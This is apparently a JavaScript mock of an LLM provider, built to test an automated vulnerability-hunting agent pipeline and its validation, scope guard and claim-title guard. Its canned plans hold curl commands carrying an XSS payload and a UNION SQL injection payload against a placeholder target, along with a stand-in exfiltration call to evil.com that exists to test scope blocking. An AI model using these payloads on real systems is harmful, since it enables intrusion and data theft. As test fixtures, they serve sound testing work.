/**
 * Mock LLM Provider for deterministic testing (31 Oct 2026, Phase 3)
 *
 * Implements the same interface as `chatWithAI(messages, system, ctx, opts)`
 * from `llm.js`, returning canned JSON responses for testing the full
 * agent pipeline without a live LLM.
 *
 * The mock exercises the SAME code path as the real provider:
 * - `callBrain` accepts `chatFn` parameter for injection
 * - Mock returns JSON strings that `actionPlan.js` validates
 * - Invalid responses test error handling
 *
 * Scenarios (controlled via `opts.mockScenario` or message content):
 * - 'valid' — well-formed plan with shell action
 * - 'invalid-json' — malformed JSON (tests error handling)
 * - 'missing-action' — JSON without action field (tests validation)
 * - 'scope-violation' — plan targeting out-of-scope host (tests scopeGuard)
 * - 'null' — returns null (tests null handling)
 *
 * Usage:
 *   import { mockChatWithAI } from './brain-mock.js';
 *   import { callBrain } from './brainProvider.js';
 *   const reply = await callBrain(messages, system, ctx, {
 *     huntId, chatFn: mockChatWithAI
 *   });
 */

const SCENARIOS = {
  // Valid shell action plan
  valid: {
    task: 'Test for reflected XSS',
    goal: 'Identify XSS vulnerabilities',
    progress: 'Starting reconnaissance',
    why_this: 'The login form has a username field that may reflect input without encoding, which is a common XSS sink.',
    why_not_alternatives: 'SQL injection is less likely here because the field appears to be used for display, not database queries. CSRF is out of scope for this test.',
    action: {
      type: 'shell',
      command: 'curl -s "http://target/login.php?username=<script>alert(1)</script>"',
    },
  },

  // Valid claim action (for testing verification pipeline)
  valid_claim: {
    task: 'File SQL injection finding',
    goal: 'Report confirmed vulnerability',
    progress: 'Verified SQLi via UNION dump',
    why_this: 'The UNION-based payload returned database content including table names and user data, confirming SQL injection.',
    why_not_alternatives: 'Blind SQLi was considered but UNION provided direct evidence, making it the stronger claim.',
    action: {
      type: 'claim',
      title: 'SQL Injection in login form',
      class: 'sqli',
      severity: 'critical',
      command: 'curl -s "http://target/login.php" -d "username=admin\' UNION SELECT 1,2,3-- -"',
      evidence: 'Response contained database table names: users, admin',
      counterevidence: 'None observed',
      confidence: 'high',
    },
  },

  // Invalid JSON (tests error handling)
  'invalid-json': 'NOT VALID JSON {{{',

  // Missing action field (tests validation)
  'missing-action': JSON.stringify({
    task: 'Test something',
    goal: 'Test goal',
    // action is missing
  }),

  // Scope violation (tests scopeGuard)
  'scope-violation': {
    task: 'Test out-of-scope target',
    goal: 'This should be blocked',
    progress: 'Attempting scope escape',
    why_this: 'Testing if scope enforcement works.',
    why_not_alternatives: 'This is a test of the scope guard, not a real attack plan.',
    action: {
      type: 'shell',
      command: 'curl -s "http://evil.com/steal"',
    },
  },

  // Probe name title (tests claimTitleGuard)
  'probe-title': {
    task: 'File probe as finding',
    goal: 'This should be bounced',
    progress: 'Testing title guard',
    why_this: 'The probe name should not become a finding title.',
    why_not_alternatives: 'A real vulnerability title would describe the vuln class, not the probe.',
    action: {
      type: 'claim',
      title: 'probe_test_something',
      class: 'agent_finding',
      severity: 'medium',
      command: 'curl -s "http://target/"',
      evidence: 'Some output',
      confidence: 'low',
    },
  },
};

/**
 * Mock chat function with the same signature as chatWithAI.
 *
 * @param {Array} messages - Chat messages
 * @param {string} system - System prompt
 * @param {Object} ctx - Context (huntId, iteration, etc.)
 * @param {Object} opts - Options, including `mockScenario`
 * @returns {string|null} JSON string reply, or null
 */
export async function mockChatWithAI(messages, system, ctx, opts = {}) {
  // Determine scenario from opts or message content
  let scenario = opts.mockScenario || 'valid';

  // Allow scenario selection via message content (for integration tests)
  const lastMessage = messages && messages.length > 0
    ? String(messages[messages.length - 1].text || '').toLowerCase()
    : '';

  if (lastMessage.includes('mock:invalid-json')) scenario = 'invalid-json';
  else if (lastMessage.includes('mock:missing-action')) scenario = 'missing-action';
  else if (lastMessage.includes('mock:scope-violation')) scenario = 'scope-violation';
  else if (lastMessage.includes('mock:probe-title')) scenario = 'probe-title';
  else if (lastMessage.includes('mock:claim')) scenario = 'valid_claim';
  else if (lastMessage.includes('mock:null')) return null;

  const response = SCENARIOS[scenario];

  if (response === undefined) {
    // Unknown scenario — return valid by default
    return JSON.stringify(SCENARIOS.valid);
  }

  if (typeof response === 'string') {
    return response; // Already a string (e.g., invalid-json)
  }

  return JSON.stringify(response);
}

/**
 * Check if mock mode is enabled.
 * Set MOCK_BRAIN=1 to use mock instead of real LLM.
 */
export function isMockBrain() {
  return process.env.MOCK_BRAIN === '1';
}

/**
 * Get the mock chat function if mock mode is enabled, else null.
 * Use with callBrain's chatFn parameter.
 */
export function getMockChatFn() {
  return isMockBrain() ? mockChatWithAI : null;
}
